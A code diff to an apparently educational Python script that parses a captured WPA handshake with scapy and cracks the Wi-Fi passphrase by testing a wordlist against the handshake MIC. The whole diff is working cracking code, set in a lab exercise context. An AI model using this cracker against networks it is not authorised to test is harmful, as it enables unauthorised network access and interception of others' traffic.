@@ -16,16 +16,61 @@ __version__ 	= "1.0"
 __email__ 		= "abraham.rubinstein@heig-vd.ch"
 __status__ 		= "Prototype"
 
+from scapy.all import *
+from scapy.contrib.wpa_eapol import WPA_key
+from binascii import a2b_hex, b2a_hex
+from pbkdf2 import *
 
-
-from wpa_key_derivation import *
+def customPRF512(key,A,B):
+    """
+    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
+    """
+    blen = 64
+    i    = 0
+    R    = b''
+    while i<=((blen*8+159)/160):
+        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
+        i+=1
+        R = R+hmacsha1.digest()
+    return R[:blen]
 
 def main():
     # Read capture file -- it contains beacon, authentication, associacion, handshake and data
     wpa=rdpcap("wpa_handshake.cap")
 
-    Ssid, APmac, Clientmac = extractDataFromAsso(wpa)
-    ANonce, SNonce, mic, data = extractDataFromHandshake(wpa)
+    # On effectue un filtre sur l'argument packets, on créé une list ne contenant que les packets correspondant à un 4WHS
+    list_Handshakes = []
+    for handshake in wpa:
+        if handshake.haslayer(WPA_key):
+            list_Handshakes.append(handshake)
+    print(len(list_Handshakes))
+
+    # On extrait les données des handshakes
+    list_HandshakesData = []
+    for handshake in list_Handshakes:
+        list_HandshakesData.append(handshake.getlayer(WPA_key))
+
+    ANonce = list_HandshakesData[0].nonce
+    SNonce = list_HandshakesData[1].nonce
+    mic = list_HandshakesData[3].wpa_key_mic
+
+    # On place la mic key à 0 afin de pouvoir extraire les données
+    list_HandshakesData[3].wpa_key_mic = 0
+
+    # On extrait les données grâce à underlayer de scapy.Packet
+    data = bytes(list_HandshakesData[3].underlayer)
+
+    # On effectue un filtre sur l'argument packets, on créé une liste ne contenant que les packets correspondant à un requête d'association
+    list_AssoReq = []
+    for packet in wpa:
+        if packet.haslayer(Dot11AssoReq):
+            list_AssoReq.append(packet)
+
+    # On sélectionne le premier élément de la liste, et on en extrait les données requises
+    assoReq = list_AssoReq[0]
+    Ssid = assoReq.info.decode('ascii')
+    APmac = a2b_hex((assoReq.addr1).replace(":", ""))
+    Clientmac = a2b_hex((assoReq.addr2).replace(":", ""))
 
     # Important parameters for key derivation - most of them can be obtained from the pcap file
     #passPhrase  = "actuelle"
@@ -46,8 +91,6 @@ def main():
     print ("AP Nonce: ",b2a_hex(ANonce),"\n")
     print ("Client Nonce: ",b2a_hex(SNonce),"\n")
 
-    #On ouvre le fichier en quesstion
-    print("\nSearching ...")
     wordlist = open('wordlist.txt', 'r')
     #On lit chaque ligne (passphrase) du fichier un à un et on en tire les clés + MIC
     for line in wordlist.readlines():
@@ -64,7 +107,7 @@ def main():
         tested_mic = hmac.new(ptk[0:16],data,hashlib.sha1)
         
         #Si le MIC généré correspond au MIC recherché, la passphrase est alors affichée
-        if tested_mic.digest()[:-4] == mic:
+        if tested_mic.digest()[:16] == mic:
             print("\nThe passphrase has been found !\n")
             print ("\nResults of the key expansion")
             print ("=============================")
